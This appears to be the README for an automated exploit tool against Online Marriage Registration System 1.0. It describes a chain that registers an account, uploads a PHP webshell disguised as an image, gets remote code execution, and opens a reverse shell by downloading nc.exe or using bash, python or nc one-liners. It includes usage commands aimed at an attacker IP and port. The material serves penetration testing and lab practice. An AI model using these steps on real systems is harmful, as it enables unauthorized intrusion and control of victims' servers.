# OMRS — Online Marriage Registration System 1.0 — RCE & Auto Reverse Shell

```
  ██████╗ ███╗   ███╗██████╗ ███████╗
 ██╔═══██╗████╗ ████║██╔══██╗██╔════╝
 ██║   ██║██╔████╔██║██████╔╝███████╗
 ██║   ██║██║╚██╔╝██║██╔══██╗╚════██║
  ██████╔╝██║ ╚═╝ ██║██║  ██║███████║
  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
  OMRS RCE & Auto ReverseShell v1.0
                     Author : 4nuxd
```

> Automated exploit for **CVE — Online Marriage Registration System 1.0**  
> Unauthenticated file upload → RCE → Auto reverse shell (Windows & Linux targets)

---

## Features

- Auto register & login (or reuse existing account with `--no-register`)
- Upload PHP webshell bypassing file type checks
- Auto-detect uploaded shell via directory diff
- Execute single commands (`-c`) or drop into full reverse shell (`-L -P`)
- **Windows target** — downloads `nc.exe` via certutil/PowerShell, executes `nc.exe -e cmd.exe`, falls back to PowerShell b64
- **Linux target** — tries bash TCP, python3, nc mkfifo, nc -e in sequence, auto PTY upgrade
- Clean interactive shell with visible input, echo suppression, and Ctrl+C support
- Built-in HTTP server to serve `nc.exe` automatically
- Proxychains compatible

---

## Requirements

```bash
pip install requests
```

For Windows targets (optional but recommended):
```bash
sudo apt install windows-binaries
```

---

## Usage

```
python3 oms.py -u <URL> [-m MOBILE] [-p PASSWORD] [-L LHOST] [-P LPORT] [--os linux|windows] [OPTIONS]
```

### Arguments

| Flag | Description |
|------|-------------|
| `-u` | Target URL (e.g. `http://192.168.1.1/`) |
| `-m` | Mobile number for registration/login |
| `-p` | Password for registration/login |
| `-L` | Your tun0/attacker IP (for reverse shell) |
| `-P` | Listener port |
| `-c` | Run a single command and exit |
| `--os` | Target OS: `linux` or `windows` (default: `linux`) |
| `--no-register` | Skip registration, use existing account |
| `--http-port` | Port to serve nc.exe on (default: `8080`) |

---

## Examples

### Single command
```bash
python3 oms.py -u http://192.168.1.100/ -m 9999999999 -p pass123 -c "whoami" --os windows
```

### Reverse shell — Linux target
```bash
python3 oms.py -u http://192.168.1.100/ -m 9999999999 -p pass123 -L 10.10.14.44 -P 4444 --os linux
```

### Reverse shell — Windows target
```bash
python3 oms.py -u http://192.168.1.100/ -m 9999999999 -p pass123 -L 10.10.14.44 -P 9001 --os windows
```

### Through proxychains (e.g. HTB)
```bash
proxychains python3 oms.py -u http://172.16.1.102/ -m 9999999999 -p 4nuxd -L 10.10.14.44 -P 9001 --os windows --no-register
```

---

## How It Works

```
1. Register / login  →  obtain PHPSESSID
2. Upload shell.php  →  disguised as image via marriage form
3. Dir diff          →  detect uploaded filename from /user/images listing
4. Verify RCE        →  whoami / id
5. Trigger payload   →  nc.exe (Windows) or bash/python (Linux)
6. Catch shell       →  interactive cmd.exe or PTY bash
```

---

## Windows Shell Flow

```
certutil  ──→  download nc.exe to C:\Windows\Temp\
PowerShell ──→  download nc.exe (fallback)
nc.exe -e cmd.exe  ──→  connect back
PowerShell b64  ──→  final fallback
```

---

## Tested On

| Target | OS | Status |
|--------|----|--------|
| HTB Dante — `dante-ws03` | Windows 10 (10.0.19042) | ✅ |
| OMRS 1.0 default install | Linux / Windows | ✅ |

---

## Disclaimer

This tool is for **authorized penetration testing and CTF purposes only**.  
Do not use against systems you do not have explicit permission to test.  
The author is not responsible for any misuse.

---

## Author

**4nuxd** — [github.com/4nuxd](https://github.com/4nuxd)
